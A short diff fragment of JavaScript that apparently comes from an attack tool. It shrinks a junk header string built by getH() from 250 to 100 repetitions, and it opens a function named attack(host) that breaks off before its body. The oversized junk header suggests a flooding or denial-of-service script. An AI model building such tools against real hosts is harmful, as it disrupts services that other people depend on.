@@ -64,7 +64,7 @@ function getUserAgent() {
 
 
 function getH() {
-  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(250);
+  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(100);
 }
 function attack(host) {
   /*
